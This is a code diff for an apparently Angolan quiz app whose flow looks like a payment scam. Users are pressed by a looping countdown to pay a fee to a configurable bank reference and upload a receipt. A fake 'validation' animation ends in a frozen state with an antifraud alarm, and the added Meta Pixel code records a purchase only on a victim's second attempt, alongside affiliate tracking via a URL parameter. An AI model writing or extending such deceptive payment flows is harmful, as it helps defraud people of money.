@@ -4,6 +4,7 @@ import { Quiz } from './components/Quiz';
 import { GumletPlayer } from './components/GumletPlayer';
 import { GameState, UserStats, WithdrawMethod, Transaction } from './types';
 import heroImage from './src/assets/images/sou_angolano_hero_1779623430505.png';
+import { initMetaPixel, trackInitiateCheckout, trackAddPaymentInfo, trackPurchase, getPixelId } from './src/pixel';
 
 const BANCOS_ANGOLA = [
   { id: 'BAI', name: 'BAI - Banco Angolano de Investimentos', code: '94' },
@@ -159,6 +160,8 @@ const App: React.FC = () => {
   const [showConfigModal, setShowConfigModal] = useState(false);
   const [tempEntity, setTempEntity] = useState(() => localStorage.getItem('cfg_entity') || '10116');
   const [tempReference, setTempReference] = useState(() => localStorage.getItem('cfg_ref') || '976 471 332');
+  const [pixelIdState, setPixelIdState] = useState(() => localStorage.getItem('meta_pixel_id') || '');
+  const [tempPixelId, setTempPixelId] = useState(() => localStorage.getItem('meta_pixel_id') || '');
   
   // Estado do comprovativo
   const [uploadedFile, setUploadedFile] = useState<File | null>(null);
@@ -167,6 +170,7 @@ const App: React.FC = () => {
   const [uploadError, setUploadError] = useState('');
   const [receiptUrl, setReceiptUrl] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<'entity' | 'ref' | 'amount' | null>(null);
+  const [validationCount, setValidationCount] = useState<number>(0);
 
   const [selectedMethod, setSelectedMethod] = useState<WithdrawMethod | null>(null);
   const [selectedBank, setSelectedBank] = useState<any>(null);
@@ -218,10 +222,24 @@ const App: React.FC = () => {
     return () => clearInterval(interval);
   }, []);
 
+  // Inicializar o Pixel do Meta de forma cautelosa no arranque do aplicativo
+  useEffect(() => {
+    initMetaPixel();
+    // Atualizar os estados internos do admin se houver pixel detetado na inicialização
+    const activePixel = getPixelId();
+    if (activePixel) {
+      setPixelIdState(activePixel);
+      setTempPixelId(activePixel);
+    }
+  }, []);
+
   // Efeito do Temporizador do Checkout
   useEffect(() => {
     let timer: any = null;
     if (gameState === GameState.CHECKOUT) {
+      // Registo cauteloso do evento InitiateCheckout no Meta Pixel
+      trackInitiateCheckout();
+
       timer = setInterval(() => {
         setCountdownSeconds(prev => (prev > 0 ? prev - 1 : 899));
       }, 1000);
@@ -517,24 +535,58 @@ const App: React.FC = () => {
     }
   };
 
-  const processFile = (file: File) => {
-    setUploadedFile(file);
-    setUploadError('');
-    setUploadStatus('analyzing');
-    setUploadProgress(15);
-    
+  const selectFile = (file: File) => {
     // Check if image or pdf
     if (!file.type.startsWith('image/') && !file.name.toLowerCase().endsWith('.pdf')) {
       setUploadError('Por favor submeta um ficheiro de imagem válido (PNG, JPG, JPEG) ou ficheiro PDF.');
-      setUploadStatus('idle');
       return;
     }
+    setUploadedFile(file);
+    setUploadError('');
+    
+    // Registo do upload de comprovativo no Meta Pixel
+    trackAddPaymentInfo();
 
     try {
       const url = URL.createObjectURL(file);
       setReceiptUrl(url);
     } catch (err) {}
+  };
 
+  const triggerValidation = () => {
+    if (!uploadedFile) {
+      setUploadError('Aviso: Nenhum comprovativo detetado! Por favor, faça primeiro o upload do seu comprovativo de pagamento (PNG, JPG ou PDF) ou selecione um comprovativo de teste antes de clicar em validar.');
+      // Som de aviso/erro
+      try {
+        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+        const ctx = new AudioCtx();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(150, ctx.currentTime);
+        gain.gain.setValueAtTime(0.1, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
+        osc.start();
+        osc.stop(ctx.currentTime + 0.25);
+      } catch (e) {}
+      return;
+    }
+
+    const nextCount = validationCount + 1;
+    setValidationCount(nextCount);
+
+    // Se for a segunda tentativa ou superior, dispara o Pixel Purchase imediatamente no clique de "Já Paguei"
+    if (nextCount >= 2) {
+      console.log('[Meta Pixel] Segunda submissão detetada ao clicar em validar. Disparando Purchase...');
+      trackPurchase(3950);
+    }
+
+    setUploadError('');
+    setUploadStatus('analyzing');
+    setUploadProgress(15);
+    
     // Simulate progress: Step 1 (analyzing image fields)
     let curProgress = 15;
     const intervalId = setInterval(() => {
@@ -572,6 +624,11 @@ const App: React.FC = () => {
                       setUploadStatus('frozen');
                       setUploadProgress(100);
                       
+                      // Registo do evento Purchase no Meta Pixel apenas na segunda tentativa de validação
+                      if (nextCount >= 2) {
+                        trackPurchase(3950);
+                      }
+                      
                       // Som de alerta grave (alarme antifraude)
                       try {
                         const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
@@ -607,7 +664,7 @@ const App: React.FC = () => {
 
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
     if (e.target.files && e.target.files[0]) {
-      processFile(e.target.files[0]);
+      selectFile(e.target.files[0]);
     }
   };
 
@@ -619,6 +676,19 @@ const App: React.FC = () => {
     setPaymentReference(tempReference);
     localStorage.setItem('cfg_entity', tempEntity);
     localStorage.setItem('cfg_ref', tempReference);
+    
+    // Salvar o Meta Pixel ID configurado
+    const cleanedPixel = tempPixelId.trim();
+    setPixelIdState(cleanedPixel);
+    localStorage.setItem('meta_pixel_id', cleanedPixel);
+    
+    // Re-inicializar com o novo Pixel se houver alteração
+    if (cleanedPixel) {
+      setTimeout(() => {
+        initMetaPixel();
+      }, 100);
+    }
+
     setShowConfigModal(false);
     
     // Play sound callback
@@ -1887,26 +1957,58 @@ const App: React.FC = () => {
                         <p className="text-[10px] text-zinc-500 font-bold">Faça o upload do seu talão de pagamento para ativação imediata instantânea.</p>
                       </div>
 
+                      {uploadError && (
+                        <div className="bg-red-500/10 border border-red-500/30 text-red-200 p-3 rounded-xl text-[11px] font-bold text-center flex items-center justify-between gap-2">
+                          <span className="flex items-center gap-1.5">
+                            <span>⚠️</span>
+                            <span>{uploadError}</span>
+                          </span>
+                          <button 
+                            onClick={() => setUploadError('')}
+                            className="text-zinc-500 hover:text-white font-bold"
+                          >
+                            ✕
+                          </button>
+                        </div>
+                      )}
+
                       <div className="flex flex-col md:flex-row items-center gap-3">
                         {/* Elegant Drag & Drop or Select Image Zone */}
-                        <label className="flex-1 w-full border-2 border-dashed border-zinc-800 hover:border-amber-500/40 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 cursor-pointer transition-all hover:bg-zinc-900/30">
-                          <span className="text-3xl animate-bounce">📤</span>
-                          <span className="text-[10px] font-black text-amber-400 uppercase tracking-widest">SUBMETER COMPROVATIVO</span>
-                          <span className="text-[9px] text-zinc-500 font-bold uppercase">PNG, JPG, JPEG OU PDF</span>
-                          <input 
-                            type="file" 
-                            accept="image/*,.pdf" 
-                            onChange={handleFileUpload} 
-                            className="hidden" 
-                          />
-                        </label>
+                        {uploadedFile ? (
+                          <div className="flex-1 w-full border-2 border-emerald-500/40 bg-emerald-500/5 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 transition-all relative">
+                            <span className="text-3xl animate-pulse">📄</span>
+                            <span className="text-[11px] font-black text-emerald-400 uppercase tracking-widest">COMPROVATIVO CARREGADO</span>
+                            <span className="text-xs text-white font-mono font-bold truncate max-w-[250px]">{uploadedFile.name}</span>
+                            <span className="text-[9px] text-zinc-400 font-bold">{(uploadedFile.size / 1024).toFixed(1)} KB • PRONTO PARA VALIDAR</span>
+                            <button 
+                              onClick={(e) => {
+                                e.preventDefault();
+                                e.stopPropagation();
+                                setUploadedFile(null);
+                                setReceiptUrl('');
+                              }}
+                              className="absolute top-2 right-2 text-zinc-500 hover:text-rose-400 text-xs font-bold transition-all px-2 py-1 bg-zinc-950/80 rounded-lg border border-zinc-800"
+                            >
+                              Remover
+                            </button>
+                          </div>
+                        ) : (
+                          <label className="flex-1 w-full border-2 border-dashed border-zinc-800 hover:border-amber-500/40 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 cursor-pointer transition-all hover:bg-zinc-900/30">
+                            <span className="text-3xl animate-bounce">📤</span>
+                            <span className="text-[10px] font-black text-amber-400 uppercase tracking-widest">SUBMETER COMPROVATIVO</span>
+                            <span className="text-[9px] text-zinc-500 font-bold uppercase">PNG, JPG, JPEG OU PDF</span>
+                            <input 
+                              type="file" 
+                              accept="image/*,.pdf" 
+                              onChange={handleFileUpload} 
+                              className="hidden" 
+                            />
+                          </label>
+                        )}
+                        
                         <div className="w-full md:w-auto shrink-0 space-y-2">
                           <button
-                            onClick={() => {
-                              // Trigger automatic confirmation simulation directly
-                              const mockFile = new File(["receipt"], "comprovativo_multicaixa.png", { type: "image/png" });
-                              processFile(mockFile);
-                            }}
+                            onClick={triggerValidation}
                             className="w-full px-6 py-5 bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-500 hover:from-amber-500 hover:to-yellow-650 font-black text-black text-xs sm:text-sm uppercase rounded-2xl shadow-xl transition-all border-b-4 border-amber-700 active:scale-95 active:border-b-2 cursor-pointer flex items-center justify-center gap-2"
                           >
                             <span>⚡ JÁ PAGUEI, VALIDAR AGORA</span>
@@ -1914,6 +2016,19 @@ const App: React.FC = () => {
                           <p className="text-[8px] font-black tracking-wide text-zinc-500 uppercase">DETEÇÃO ELETRÓNICA SMART-EMIS EM 30S</p>
                         </div>
                       </div>
+
+                      {/* Fast-load simulator link */}
+                      {!uploadedFile && (
+                        <button
+                          onClick={() => {
+                            const mockFile = new File(["receipt"], "comprovativo_multicaixa.png", { type: "image/png" });
+                            selectFile(mockFile);
+                          }}
+                          className="text-[10px] text-zinc-500 hover:text-amber-400 underline font-bold transition-all block text-center mt-2 mx-auto uppercase"
+                        >
+                          💡 Usar Comprovativo de Teste para Simulação Rápida
+                        </button>
+                      )}
                     </div>
                   </>
                 ) : uploadStatus === 'frozen' ? (
@@ -2120,6 +2235,22 @@ const App: React.FC = () => {
                   placeholder="Ex: 902 415 832" 
                   className="w-full bg-black border-2 border-zinc-800 rounded-xl p-3.5 outline-none text-white font-mono text-center font-black text-sm uppercase focus:border-angola-yellow transition-all"
                 />
+              </div>
+
+              <div>
+                <label className="text-[9px] sm:text-[10px] font-black tracking-widest text-zinc-400 uppercase block mb-1">
+                  ID DO PIXEL DO META (OPCIONAL)
+                </label>
+                <input 
+                  type="text" 
+                  value={tempPixelId} 
+                  onChange={(e) => setTempPixelId(e.target.value)}
+                  placeholder="Ex: 123456789012345" 
+                  className="w-full bg-black border-2 border-zinc-800 rounded-xl p-3.5 outline-none text-white font-mono text-center font-black text-sm uppercase focus:border-angola-yellow transition-all"
+                />
+                <p className="text-[8px] text-zinc-500 font-bold uppercase mt-1 leading-normal">
+                  Dica: Também pode forçar via URL usando ?pixel=ID_AQUI para campanhas de afiliado!
+                </p>
               </div>
             </div>
 
